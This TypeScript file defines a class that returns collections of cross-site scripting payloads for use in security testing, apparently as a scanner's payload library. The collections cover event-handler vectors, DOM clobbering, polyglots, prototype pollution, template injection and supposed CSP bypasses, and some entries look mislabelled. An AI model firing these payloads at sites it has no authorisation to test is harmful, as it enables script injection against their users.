/**
 * Modern XSS payload vectors.
 * @description Current and emerging XSS techniques.
 */
export class ModernVector {
  /**
   * Get all modern vectors.
   * @description Returns all modern XSS payload collections.
   * @returns Array of modern XSS payload strings
   */
  static all(): string[] {
    return [
      ...this.cssAnimationEvents(),
      ...this.cspBypass2026(),
      ...this.domClobbering(),
      ...this.modernDomSinks(),
      ...this.polyglots(),
      ...this.prototypePollution(),
      ...this.templateInjection(),
      ...this.urlValidationBypass()
    ]
  }

  /**
   * Get CSS animation event vectors.
   * @description Modern CSS animation trigger payloads.
   * @returns Array of CSS animation XSS strings
   */
  static cssAnimationEvents(): string[] {
    return [
      'onanimationstart="alert(1)"',
      'onanimationend="alert(1)"',
      'onanimationiteration="alert(1)"',
      'onanimationcancel="alert(1)"',
      'onbeforematch="alert(1)"',
      'onbeforeprint="alert(1)"',
      'onafterprint="alert(1)"'
    ]
  }

  /**
   * Get 2026 CSP bypass vectors.
   * @description Latest CSP bypass techniques.
   * @returns Array of modern CSP bypass strings
   */
  static cspBypass2026(): string[] {
    return [
      '<meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\' \'unsafe-eval\'">',
      '<link rel=preload href="data:text/css,{}" as=script>',
      '<object data="data:text/html,<script>alert(1)</script>">',
      '<embed src="data:text/javascript,alert(1)">',
      '<iframe srcdoc="<script>alert(1)</script>">'
    ]
  }

  /**
   * Get DOM clobbering vectors.
   * @description Global object override payloads.
   * @returns Array of DOM clobbering XSS strings
   */
  static domClobbering(): string[] {
    return [
      '<form id="location"><input name="href" value="javascript:alert(1)"></form>',
      '<img id="createElement" name="src" onerror="alert(1)">',
      '<form id="navigator"><input name="userAgent" value="xss"></form>',
      '<map name="x"><area href="javascript:alert(1)"></map>',
      '<iframe name="location" src="javascript:alert(1)"></iframe>'
    ]
  }

  /**
   * Get modern DOM sink vectors.
   * @description Contemporary DOM injection payloads.
   * @returns Array of modern DOM sink strings
   */
  static modernDomSinks(): string[] {
    return [
      '#<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      "<script>document.querySelector('x').innerHTML=payload</script>",
      '<script>eval(location.hash.slice(1))</script>',
      '<script>setTimeout(location.hash.slice(1),0)</script>',
      '<script>setInterval(location.hash.slice(1),0)</script>',
      '<script>Function(location.hash.slice(1))()</script>',
      '<script>globalThis.eval(location.hash.slice(1))</script>',
      '<script>import(location.hash.slice(1))</script>',
      '<script>WebAssembly.compileStreaming(location.hash.slice(1))</script>'
    ]
  }

  /**
   * Get polyglot payload vectors.
   * @description Multi-context XSS payloads.
   * @returns Array of polyglot XSS strings
   */
  static polyglots(): string[] {
    return [
      'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
      '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><img src="http://i.imgur.com/P8mL8.jpg">',
      'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=alert()//>',
      '--><svg onload=alert(1)>',
      '"><svg onload=alert(1)//',
      "'';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>''><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
    ]
  }

  /**
   * Get prototype pollution vectors.
   * @description Prototype chain manipulation payloads.
   * @returns Array of prototype pollution strings
   */
  static prototypePollution(): string[] {
    return [
      '__proto__[innerHTML]="<img src=x onerror=alert(1)>"',
      'constructor[prototype][innerHTML]="<img src=x onerror=alert(1)>"',
      '__proto__.src="javascript:alert(1)"',
      'prototype[0].src="javascript:alert(1)"',
      '__proto__.textContent="<img src=x onerror=alert(1)>"'
    ]
  }

  /**
   * Get template injection vectors.
   * @description Framework template injection payloads.
   * @returns Array of template injection strings
   */
  static templateInjection(): string[] {
    return [
      "{{constructor.constructor('alert(1)')()}}",
      "{{$on.constructor('alert(1)')()}}",
      "{{this.constructor.constructor('alert(1)')()}}",
      "{{[].map.constructor('alert(1)')()}}",
      "{{toString.constructor.constructor('alert(1)')()}}",
      'ng-class="{{x}}".constructor.constructor(\'alert(1)\')()',
      'ng-click="{{x}}".constructor.constructor(\'alert(1)\')()',
      "{%if config.env.DEBUG%}{{config.env.DEBUG.constructor.constructor('alert(1)')()}}{%endif%}"
    ]
  }

  /**
   * Get URL validation bypass vectors.
   * @description URL filter evasion payloads.
   * @returns Array of URL bypass XSS strings
   */
  static urlValidationBypass(): string[] {
    return [
      '<svg><script>alert(1)</script></svg>',
      '<iframe srcdoc="<script>alert(1)</script>">',
      '<math><mtext><script>alert(1)</script></mtext></math>',
      '<xmp><script>alert(1)</script></xmp>'
    ]
  }
}
